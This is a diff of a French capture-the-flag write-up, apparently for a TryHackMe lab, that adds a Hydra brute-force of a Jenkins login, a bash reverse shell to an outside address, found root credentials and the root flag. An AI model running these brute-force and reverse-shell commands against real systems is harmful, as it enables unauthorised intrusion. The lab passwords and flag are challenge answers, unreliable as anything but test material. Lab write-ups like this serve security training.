@@ -200,6 +200,39 @@ Après une longue recherche infructueuse, je me laisse tenter par un brute force
 on va utiliser Hydra pour cela :
 
 ```
-hydra -l admin -P /home/kali/Wordlist/rockyou.txt localhost -s 4545 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=PASS^&from=%2F&Submit=Sign+in:F=Invalid username or password" -I
+hydra -l admin -P /home/kali/Wordlist/rockyou.txt 127.0.0.1 -s 4545 -V -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password"
+```
+On trouve le mdp ! :
+```
+[4545][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
+```
+On se connecte sur jenkins, on peu créer des taches qui execute des scripts.
+On créer donc un revershell :
+```
+/bin/bash -i >& /dev/tcp/10.11.50.195/4444 0>&1
 ```
 
+On a le revershell !
+On va fouiller un peu
+```
+jenkins@jenkins:/opt$ cat note.txt
+cat note.txt
+Aubreanna,
+
+Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you 
+need access to the root user account.
+
+root:tr0ub13guM!@#123
+```
+On retourne sur la session SSH de Aubreanna
+```
+aubreanna@internal:/etc/phpmyadmin$ su - root
+Password: 
+root@internal:~#
+```
+
+Et le flag !
+```
+root@internal:~# cat /root/root.txt
+THM{d0ck3r_d3str0y3r}
+```
